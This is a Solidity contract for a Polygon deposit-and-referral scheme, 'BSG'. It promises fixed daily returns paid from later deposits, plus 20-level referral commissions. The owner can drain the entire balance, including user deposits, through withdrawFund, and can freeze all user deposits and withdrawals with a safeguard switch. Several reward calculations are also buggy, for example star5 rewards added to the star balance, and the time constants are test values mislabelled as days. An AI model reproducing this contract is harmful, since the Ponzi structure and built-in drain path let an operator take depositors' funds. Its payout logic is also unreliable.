/**
 *Submitted for verification at polygonscan.com on 2022-10-15
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract BSG is Ownable {

    using SafeMath for uint256;

    uint256 private constant baseDivider = 10000;

    uint256 public feePercents = 500;

    uint256 public  widthfeePercents;

    uint256 public constant minDeposit = 5e17;

    uint256 public  tradingSplit = 1875;

    uint256 private constant timeStep = 300;//1 days;

    uint256 private constant dayPerCycle = 2100; // 7 days;

    uint256 private constant dayRewardPercents = 200;

    uint256 private constant maxAddFreeze = 13500;//45 days;

    uint256 private constant referDepth = 20;

    uint256 public constant directPercents = 500;

    uint256[9] private level4Percents = [100, 200, 300, 100, 200, 100, 100, 100, 100];

    uint256[10] private level5Percents = [50, 50, 50, 50, 50, 50, 50, 50, 50, 50];

    uint256 public level4royalty = 30;

    uint256 public level4allow = 20;

    uint256 public level5royalty = 50;

    uint256 public level5allow = 25;

    uint256 public emptyPool4Rewards ;

    uint256 public emptyPool5Rewards  ;

    uint256[5] private balDown = [10e22, 30e22, 100e22, 500e22, 1000e22];

    uint256[5] private balDownRate = [1000, 1500, 2000, 5000, 6000];

    uint256[5] private balRecover = [15e22, 50e22, 150e22, 500e22, 1000e22];

    mapping(uint256=>bool) public balStatus; // bal=>status

    address public feeReceivers;

    address public defaultRefer;

    uint256 public immutable startTime;

    uint256 public lastDistribute;

    uint256 public totalUser;

    uint256 public level4Pool;

    uint256 public level5Pool;

    address[] public level4Users;

    address[] public level5Users;

    bool public safeguard;  //putting safeguard on will halt all non-owner functions

    bool public isLimitForWithdraw = true;

    uint public withdrawLimitFactor = 2;

    bool public isSplitForWithdraw = true;

    uint public withdrawSplitFactor = 5000;

    uint256 public ownerFund;


    struct OrderInfo {

        uint256 amount;

        uint256 start;

        uint256 unfreeze;

        bool isUnfreezed;

        uint256 maxWithdraw;

        uint256 amountWithdrawn;

    }

    mapping(address => OrderInfo[]) public orderInfos;

    address[] public depositors;

    struct UserInfo {

        address referrer;

        uint256 start;

        uint256 level; //  3, 4, 5

        uint256 maxDeposit;

        uint256 totalDeposit;

        uint256 teamNum;

        uint256 maxDirectDeposit;

        uint256 teamTotalDeposit;

        uint256 totalFreezed;

        uint256 totalRevenue;

        uint256 lostComm;

        uint256 totalWithdrawn;

        uint256 retopUpWallet;

    }

    mapping(address=>UserInfo) public userInfo;

    mapping(address => mapping(uint256 => address[])) public teamUsers;

    mapping(address => mapping(uint256 => uint256)) public teamlevelIncome;

    struct RewardInfo{

        uint256 capitals;

        uint256 statics;

        uint256 directs;

        uint256 level4Released;

        uint256 level5Released;

        uint256 star;

        uint256 star5;

    }

    mapping(address=>RewardInfo) public rewardInfo;

    bool public isFreezeReward;

    event Deposit(address user, uint256 amount);

    event Withdraw(address user, uint256 withdrawn);

    constructor(address _defaultRefer, address _feeReceivers)  {

        feeReceivers = _feeReceivers;

        startTime = block.timestamp;

        lastDistribute = block.timestamp;

        defaultRefer = _defaultRefer;

    }

    function register(address _referral, address _user) private {

        //require(userInfo[_referral].totalDeposit > 0 || _referral == defaultRefer , "invalid refer");

        if(userInfo[_referral].totalDeposit == 0 && _referral != defaultRefer)
        {
            _referral = defaultRefer;
        }

        UserInfo storage user = userInfo[_user];

        user.referrer = _referral;

        user.start = block.timestamp;

        _updateTeamNum(_user);

        totalUser = totalUser.add(1);

    }

    function deposit(address referrer, uint256 _amount) payable external {

        address _sender = msg.sender;

        uint256 msgvalue= msg.value;

        require(!safeguard && !isContract(_sender),"Wrong");

        if(userInfo[_sender].retopUpWallet >= _amount )
        {
            userInfo[_sender].retopUpWallet  = userInfo[_sender].retopUpWallet.sub(_amount);
            if(msgvalue > 0)
            {
                payable(_sender).transfer(msgvalue);
            }
        }
        else {

            uint256 amountAfter  = _amount.sub(userInfo[_sender].retopUpWallet);

            require(msgvalue >= amountAfter,"Insufficient MATIC");

            userInfo[_sender].retopUpWallet = 0;

            if(msgvalue > amountAfter)
            {
                payable(_sender).transfer(msgvalue - amountAfter);
            }

        }

        if(userInfo[_sender].referrer == address(0))
        {
            register(referrer, _sender);
        }

        _deposit(_sender, _amount);

        emit Deposit(_sender, _amount);

    }

    function distributePoolRewards() public {

        if(block.timestamp > lastDistribute.add(timeStep)){

            _distributeLevelPool();

            lastDistribute = block.timestamp;

        }

    }

    function withdraw() external {

        address _sender = msg.sender;

        require(!safeguard && !isContract(_sender),"Wrong");

        distributePoolRewards();

        RewardInfo storage userRewards = rewardInfo[_sender];

        uint256 staticReward = userRewards.statics;

        (uint256 canWithdraw, uint256 orderIndex) = getMaxComm(_sender);

        uint256 dynamicReward = userRewards.directs ;

        if(isLimitForWithdraw){

            if(canWithdraw >= dynamicReward)
            {
                userRewards.directs = 0;

                canWithdraw = canWithdraw - dynamicReward;

                if(canWithdraw >= dynamicReward.add(userRewards.level4Released))
                {
                    userRewards.level4Released = 0;

                    dynamicReward = dynamicReward.add(userRewards.level4Released);

                    canWithdraw = canWithdraw - dynamicReward;

                    if(canWithdraw >= dynamicReward.add(userRewards.level5Released))
                    {
                        userRewards.level5Released = 0;

                        dynamicReward = dynamicReward.add(userRewards.level5Released);

                        canWithdraw = canWithdraw - dynamicReward;

                        if(canWithdraw >= dynamicReward.add(userRewards.star))
                        {
                            userRewards.star = 0;

                            dynamicReward = dynamicReward.add(userRewards.star);

                            canWithdraw = canWithdraw - dynamicReward;

                            if(canWithdraw >= dynamicReward.add(userRewards.star5))
                            {
                                userRewards.star5 = 0;

                                dynamicReward = dynamicReward.add(userRewards.star5);

                            }
                            else {

                                userRewards.star5 = userRewards.star5.sub(canWithdraw);

                                dynamicReward = dynamicReward.add(canWithdraw);

                            }

                        }
                        else {

                                userRewards.star = userRewards.star.sub(canWithdraw);

                                dynamicReward = dynamicReward.add(canWithdraw);

                            }

                    }
                    else {

                            userRewards.level5Released = userRewards.level5Released.sub(canWithdraw);

                            dynamicReward = dynamicReward.add(canWithdraw);

                        }

                }
                else {

                        userRewards.level4Released = userRewards.level4Released.sub(canWithdraw);

                        dynamicReward = dynamicReward.add(canWithdraw);

                    }
            }
            else {

                userRewards.directs = userRewards.directs.sub(canWithdraw);

                dynamicReward = dynamicReward.add(canWithdraw);

            }
        }
        else {

            dynamicReward = userRewards.directs.add(userRewards.level4Released).add(userRewards.level5Released).add(userRewards.star).add(userRewards.star5);

            userRewards.directs = 0;

            userRewards.level4Released = 0;

            userRewards.level5Released = 0;

            userRewards.star = 0;

            userRewards.star5 = 0;
        }

        orderInfos[_sender][orderIndex].amountWithdrawn = orderInfos[_sender][orderIndex].amountWithdrawn.add(dynamicReward);

        uint256 withdrawable = staticReward.add(dynamicReward);

        userRewards.statics = 0;

        withdrawable = withdrawable.add(userRewards.capitals);

        userRewards.capitals = 0;

        require(address(this).balance.sub(ownerFund) >= withdrawable, "Not enough fund" );

        if(withdrawable>0)
        {
            userInfo[_sender].totalWithdrawn = userInfo[_sender].totalWithdrawn.add(withdrawable);

            emit Withdraw(_sender, withdrawable);

            if(widthfeePercents>0){

                uint256 withdrawfee = withdrawable.mul(widthfeePercents).div(baseDivider);

                payable(feeReceivers).transfer(withdrawfee);

                withdrawable = withdrawable - withdrawfee;

            }

            payable(_sender).transfer(withdrawable);

            uint256 bal = address(this).balance;

            _setFreezeReward(bal);

        }

    }

    function getCurDay() public view returns(uint256) {

        return (block.timestamp.sub(startTime)).div(timeStep);

    }

    function getTeamUsersLength(address _user, uint256 _layer) external view returns(uint256) {

        return teamUsers[_user][_layer].length;

    }

    function getOrderLength(address _user) public view returns(uint256) {

        return orderInfos[_user].length;

    }

    function getDepositorsLength() external view returns(uint256) {

        return depositors.length;

    }

    function getMaxFreezing(address _user) public view returns(uint256) {

        uint256 maxFreezing;

        for(uint256 i = orderInfos[_user].length; i > 0; i--){

            OrderInfo storage order = orderInfos[_user][i - 1];

            if(order.unfreeze > block.timestamp){

                if(order.amount > maxFreezing){

                    maxFreezing = order.amount;

                }

            }else{

                break;

            }

        }

        return (maxFreezing);

    }

    function getMaxComm(address _user) public view returns(uint256,uint256) {

        uint256 canWithdraw;

        uint orderIndex = orderInfos[_user].length - 1;

        OrderInfo storage order = orderInfos[_user][orderIndex];

        if(order.maxWithdraw > order.amountWithdrawn)
        {
            canWithdraw = order.maxWithdraw - order.amountWithdrawn;
        }

        return (canWithdraw, orderIndex);

    }

    function getTeamDeposit(address _user) public view returns(uint256, uint256, uint256){

        uint256 totalTeam;

        uint256 maxTeam;

        uint256 otherTeam;

        for(uint256 i = 0; i < teamUsers[_user][0].length; i++){

            uint256 userTotalTeam = userInfo[teamUsers[_user][0][i]].teamTotalDeposit.add(userInfo[teamUsers[_user][0][i]].totalDeposit);

            totalTeam = totalTeam.add(userTotalTeam);

            if(userTotalTeam > maxTeam){

                maxTeam = userTotalTeam;

            }

        }

        otherTeam = totalTeam.sub(maxTeam);

        return(maxTeam, otherTeam, totalTeam);

    }


    function _updateTeamNum(address _user) private {

        UserInfo storage user = userInfo[_user];

        address upline = user.referrer;

        for(uint256 i = 0; i < referDepth; i++){

            if(upline != address(0)){

                userInfo[upline].teamNum = userInfo[upline].teamNum.add(1);

                teamUsers[upline][i].push(_user);

                _updateLevel(upline);

                if(upline == defaultRefer) break;

                upline = userInfo[upline].referrer;

            }else{

                break;

            }

        }

    }

    function _removeInvalidDeposit(address _user, uint256 _amount) private {

        UserInfo storage user = userInfo[_user];

        address upline = user.referrer;

        for(uint256 i = 0; i < referDepth; i++){

            if(upline != address(0)){

                if(userInfo[upline].teamTotalDeposit > _amount){

                    userInfo[upline].teamTotalDeposit = userInfo[upline].teamTotalDeposit.sub(_amount);

                }else{

                    userInfo[upline].teamTotalDeposit = 0;

                }

                if(upline == defaultRefer) break;

                upline = userInfo[upline].referrer;

            }else{

                break;

            }

        }

    }

    function _updateLevel(address _user) private {

        UserInfo storage user = userInfo[_user];

        uint256 levelNow = _calLevelNow(_user);

        if(levelNow > user.level){

            user.level = levelNow;

            if(levelNow == 4){

                level4Users.push(_user);

            }
            else if(levelNow == 5){
                uint i = 0;
                while (level4Users[i] != _user) {
                    i++;
                }

                delete level4Users[i];

                level5Users.push(_user);

            }

        }

    }

    function _calLevelNow(address _user) private view returns(uint256) {

        UserInfo storage user = userInfo[_user];

        uint256 total = user.maxDeposit;

        uint256 levelNow;

        (uint256 maxTeam, uint256 otherTeam, ) = getTeamDeposit(_user);

        //if(total >= 5000e18 && user.teamNum >= 200 && maxTeam >= 100000e18 && otherTeam >= 100000e18){
        if(total >= 4e18 && user.teamNum >= 5 && maxTeam >= 4e18 && otherTeam >= 4e18){

            levelNow = 5;

        //}else if(total >= 1000e18 && user.teamNum >= 40 && maxTeam >= 7000e18 && otherTeam >= 7000e18){
        }else if(total >= 2e18 && user.teamNum >= 3 && maxTeam >= 2e18 && otherTeam >= 2e18){

            levelNow = 4;

        }else{

            levelNow = 3;

        }

        return levelNow;

    }

    function _deposit(address _user, uint256 _amount) private {

        UserInfo storage user = userInfo[_user];

        require(_amount >= minDeposit, "less than min");

        require(_amount.mod(minDeposit) == 0 && _amount >= minDeposit, "mod err");

        require(user.maxDeposit == 0 || _amount >= user.maxDeposit, "less before");

        if(user.maxDeposit == 0){

            user.maxDeposit = _amount;

        }else if(user.maxDeposit < _amount){

            user.maxDeposit = _amount;

        }

        _distributeDeposit(_amount);

        depositors.push(_user);

        user.totalDeposit = user.totalDeposit.add(_amount);

        user.totalFreezed = user.totalFreezed.add(_amount);

        _updateLevel(_user);

        uint256 addFreeze = (orderInfos[_user].length).mul(timeStep);

        if(addFreeze > maxAddFreeze){

            addFreeze = maxAddFreeze;

        }

        uint256 unfreezeTime = block.timestamp.add(dayPerCycle).add(addFreeze);

        orderInfos[_user].push(OrderInfo(

            _amount,

            block.timestamp,

            unfreezeTime,

            false,

            _amount * withdrawLimitFactor,

            0

        ));

        _unfreezeFundAndUpdateReward(_user, _amount);

        distributePoolRewards();

        _updateReward(_user, _amount);

        uint256 bal = address(this).balance;

        _balActived(bal);

        if(isFreezeReward){

            _setFreezeReward(bal);

        }

    }

    function _unfreezeFundAndUpdateReward(address _user, uint256 _amount) private {

        UserInfo storage user = userInfo[_user];

        bool isUnfreezeCapital;

        for(uint256 i = 0; i < orderInfos[_user].length; i++){

            OrderInfo storage order = orderInfos[_user][i];

            if(block.timestamp > order.unfreeze  && order.isUnfreezed == false && _amount >= order.amount){

                order.isUnfreezed = true;

                isUnfreezeCapital = true;

                if(user.totalFreezed > order.amount){

                    user.totalFreezed = user.totalFreezed.sub(order.amount);

                }else{

                    user.totalFreezed = 0;

                }

                _removeInvalidDeposit(_user, order.amount);

                uint256 staticReward = order.amount.mul(dayRewardPercents).mul(dayPerCycle).div(timeStep).div(baseDivider);

                if(isFreezeReward){

                    if(user.totalFreezed > user.totalRevenue){

                        uint256 leftCapital = user.totalFreezed.sub(user.totalRevenue);

                        if(staticReward > leftCapital){

                            staticReward = leftCapital;

                        }

                    }else{

                        staticReward = 0;

                    }

                }

                rewardInfo[_user].capitals = rewardInfo[_user].capitals.add(order.amount);

                rewardInfo[_user].statics = rewardInfo[_user].statics.add(staticReward);

                user.totalRevenue = user.totalRevenue.add(staticReward);

                break;

            }

        }

    }


    function _distributeLevelPool() private {

          uint256 level4Count;

          for(uint256 i = 0; i < level4Users.length; i++){

              if(userInfo[level4Users[i]].level == 4 && getMaxFreezing(level4Users[i])>0 && level4Users[i] != address(0)){

                  level4Count = level4Count.add(1);

              }

          }
        uint256 totalrewards;
          if(level4Count > 0){

              uint256 level4reward = level4Pool.div(level4Count);

              for(uint256 i = 0; i < level4Users.length; i++){

                  if(userInfo[level4Users[i]].level == 4 && level4Users[i] != address(0)){

                      if(getMaxFreezing(level4Users[i]) >0) {
                          totalrewards = totalrewards.add(level4reward) ;
                        if(isSplitForWithdraw && withdrawSplitFactor > 0)
                        {
                            uint256 splitlevel4Reward= level4reward.mul(withdrawSplitFactor).div(baseDivider);
                            userInfo[level4Users[i]].retopUpWallet =  userInfo[level4Users[i]].retopUpWallet.add(splitlevel4Reward);
                            rewardInfo[level4Users[i]].star = rewardInfo[level4Users[i]].star.add(level4reward.sub(splitlevel4Reward));                            
                        }
                        else {
                            rewardInfo[level4Users[i]].star = rewardInfo[level4Users[i]].star.add(level4reward);
                        }

                        userInfo[level4Users[i]].totalRevenue = userInfo[level4Users[i]].totalRevenue.add(level4reward);



                      }
                      else {
                        userInfo[level4Users[i]].lostComm = userInfo[level4Users[i]].lostComm.add(level4reward);
                      }

                    }
              }
          }

          if(level4Pool > totalrewards)
          {
              level4Pool = level4Pool.sub(totalrewards);
              emptyPool4Rewards = emptyPool4Rewards.add(level4Pool);
              payable(feeReceivers).transfer(level4Pool);
          }

         level4Pool = 0;

        totalrewards = 0;
          uint256 level5Count;

          for(uint256 i = 0; i < level5Users.length; i++){

              if(userInfo[level5Users[i]].level == 5 && getMaxFreezing(level5Users[i])>0 && level5Users[i] != address(0)){

                  level5Count = level5Count.add(1);

              }

          }

          if(level5Count > 0){

              uint256 level5reward = level5Pool.div(level5Count);

              for(uint256 i = 0; i < level5Users.length; i++){

                  if(userInfo[level5Users[i]].level == 5 && level5Users[i] != address(0)){

                      if(getMaxFreezing(level5Users[i])>0){
                        totalrewards = totalrewards.add(level5reward) ;
                        if(isSplitForWithdraw && withdrawSplitFactor > 0)
                        {
                            uint256 splitlevel5Reward= level5reward.mul(withdrawSplitFactor).div(baseDivider);
                            userInfo[level5Users[i]].retopUpWallet =  userInfo[level5Users[i]].retopUpWallet.add(splitlevel5Reward);
                            rewardInfo[level5Users[i]].star5 = rewardInfo[level5Users[i]].star.add(splitlevel5Reward);                            
                        }
                        else {
                            rewardInfo[level5Users[i]].star5 = rewardInfo[level5Users[i]].star.add(level5reward);
                        }
                        userInfo[level5Users[i]].totalRevenue = userInfo[level5Users[i]].totalRevenue.add(level5reward);
                      }
                      else
                      {
                        userInfo[level5Users[i]].lostComm = userInfo[level5Users[i]].lostComm.add(level5reward);
                      }
                  }

              }

          }
           if(level5Pool > totalrewards)
          {
              level5Pool = level5Pool.sub(totalrewards);
              emptyPool5Rewards = emptyPool5Rewards.add(level5Pool);
              payable(feeReceivers).transfer(level5Pool);
          }

           level5Pool = 0;

      }


    function _distributeDeposit(uint256 _amount) private {

        uint256 fee = _amount.mul(feePercents).div(baseDivider);

        uint256 tradingSplitamount = _amount.mul(tradingSplit).div(baseDivider);

        ownerFund = ownerFund.add(fee).add(tradingSplitamount);

        uint256 level4 = _amount.mul(level4royalty + level4allow).div(baseDivider);

        level4Pool = level4Pool.add(level4);

        uint256 level5 = _amount.mul(level5royalty + level5allow).div(baseDivider);

        level5Pool = level5Pool.add(level5);

    }

    function _updateReward(address _user, uint256 _amount) private {

        UserInfo storage user = userInfo[_user];

        address upline = user.referrer;

        uint256 lossCommision ;

        for(uint256 i = 0; i < referDepth; i++){

            if(upline != address(0)){

                userInfo[upline].teamTotalDeposit = userInfo[upline].teamTotalDeposit.add(_amount);

                _updateLevel(upline);

                uint256 newAmount = _amount;

                if(upline != defaultRefer){

                    uint256 maxFreezing = getMaxFreezing(upline);

                    if(maxFreezing == 0){

                        newAmount = maxFreezing;

                    }

                }

                RewardInfo storage upRewards = rewardInfo[upline];

                uint256 reward;

                if(i > 9){

                    if(userInfo[upline].level > 4){

                        reward = newAmount.mul(level5Percents[i - 10]).div(baseDivider);

                        if(isSplitForWithdraw && withdrawSplitFactor > 0)
                        {
                            uint256 release = reward.mul(withdrawSplitFactor).div(baseDivider);
                            userInfo[upline].retopUpWallet =  userInfo[upline].retopUpWallet.add(release);
                            upRewards.level5Released = upRewards.level5Released.add(reward.sub(release));
                            
                        }
                        else {
                            upRewards.level5Released = upRewards.level5Released.add(reward);
                        }

                        lossCommision = _amount.mul(level5Percents[i - 10]).div(baseDivider);

                    }

                }else if(i > 0){

                     reward = newAmount.mul(level4Percents[i - 1]).div(baseDivider);

                     lossCommision = _amount.mul(level4Percents[i - 1]).div(baseDivider);

                    if( userInfo[upline].level > 3 && i > 2){

                        if(isSplitForWithdraw && withdrawSplitFactor > 0)
                        {
                            uint256 release = reward.mul(withdrawSplitFactor).div(baseDivider);
                            userInfo[upline].retopUpWallet =  userInfo[upline].retopUpWallet.add(release);
                            upRewards.level4Released = upRewards.level4Released.add(reward.sub(release));                            
                        }
                        else {
                            upRewards.level4Released = upRewards.level4Released.add(reward);
                        }

                    }
                    else {

                        if(isSplitForWithdraw && withdrawSplitFactor > 0)
                        {
                            uint256 splitlevelReward = reward.mul(withdrawSplitFactor).div(baseDivider);
                            userInfo[upline].retopUpWallet =  userInfo[upline].retopUpWallet.add(splitlevelReward);
                            upRewards.directs = upRewards.directs.add(reward.sub(splitlevelReward));                            
                        }
                        else {
                            upRewards.directs = upRewards.directs.add(reward);
                        }

                    }

                }else{

                    reward = newAmount.mul(directPercents).div(baseDivider);

                    lossCommision = _amount.mul(directPercents).div(baseDivider);

                    if(isSplitForWithdraw && withdrawSplitFactor > 0)
                    {
                        uint256 splitlevelReward = reward.mul(withdrawSplitFactor).div(baseDivider);
                        userInfo[upline].retopUpWallet =  userInfo[upline].retopUpWallet.add(splitlevelReward);
                        upRewards.directs = upRewards.directs.add(reward.sub(splitlevelReward));                        
                    }
                    else {
                        upRewards.directs = upRewards.directs.add(reward);
                    }
                }


                if(newAmount == 0)
                {
                    userInfo[upline].lostComm = userInfo[upline].lostComm.add(lossCommision) ;
                }
                else
                {
                    userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.add(reward);
                    teamlevelIncome[upline][i] = teamlevelIncome[upline][i].add(reward);
                }

                if(upline == defaultRefer) break;

                upline = userInfo[upline].referrer;

            }else{

                break;

            }

        }

    }

    function _balActived(uint256 _bal) private {

        for(uint256 i = balDown.length; i > 0; i--){

            if(_bal >= balDown[i - 1]){

                balStatus[balDown[i - 1]] = true;

                break;

            }

        }

    }

    function _setFreezeReward(uint256 _bal) private {

        for(uint256 i = balDown.length; i > 0; i--){

            if(balStatus[balDown[i - 1]]){

                uint256 maxDown = balDown[i - 1].mul(balDownRate[i - 1]).div(baseDivider);

                if(_bal < balDown[i - 1].sub(maxDown)){

                    isFreezeReward = true;

                }else if(isFreezeReward && _bal >= balRecover[i - 1]){

                    isFreezeReward = false;

                }

                break;

            }

        }

    }

    function updatedData(address _feeReceivers, uint256 _depositFee, uint256 _tradingSplit, uint256 _level4royalty, uint256 _level4allow, uint256 _level5royalty, uint256 _level5allow) external onlyOwner returns(bool)
    {
        require(_depositFee.add(_tradingSplit.add(_level4royalty.add(_level4allow.add(_level5royalty.add(_level5allow))))) <= 10000, "invalid percentages") ;
        feePercents = _depositFee;
        tradingSplit = _tradingSplit;
        level4royalty= _level4royalty;
        level4allow = _level4allow;
        level5royalty = _level5royalty;
        level5allow= _level5allow;
        feeReceivers = _feeReceivers;
        return true;
    }

    function updatedWithdrawFactors(bool _isLimitForWithdraw, uint256 _withdrawLimitFactor, bool _isSplitForWithdraw, uint256 _withdrawSplitFactor, uint256 _widthfeePercents) external onlyOwner returns(bool)
    {
        require(_widthfeePercents <= 1000, "invalid percentages") ;
        widthfeePercents= _widthfeePercents;
        isLimitForWithdraw = _isLimitForWithdraw;
        withdrawLimitFactor = _withdrawLimitFactor;
        isSplitForWithdraw= _isSplitForWithdraw;
        withdrawSplitFactor = _withdrawSplitFactor;
        return true;
    }

    function changeSafeguardStatus() onlyOwner public{
        if (safeguard == false){
            safeguard = true;
        }
        else{
            safeguard = false;
        }
    }
    function withdrawFund(uint256 _amount, bool isIncludeOwnerFund) public onlyOwner returns(bool)
    {
        require(!isContract(msg.sender),  "No contract address allowed");
        if(_amount >0){
            if(isIncludeOwnerFund)
            {
                require(address(this).balance >= _amount,"Insufficient Balance");
                if(ownerFund >= _amount)
                {
                    ownerFund = ownerFund.sub(_amount);
                }
                else {
                    ownerFund = 0;
                }

                payable(feeReceivers).transfer(_amount);

            }
            else {
                require(address(this).balance.sub(ownerFund) >= _amount,"Insufficient Balance");
                payable(feeReceivers).transfer(_amount);
            }
        }
        return true;
    }

    function isContract(address _address) internal view returns (bool){
        uint32 size;
        assembly {
            size := extcodesize(_address)
        }
        return (size > 0);
    }

    receive() external payable {}
}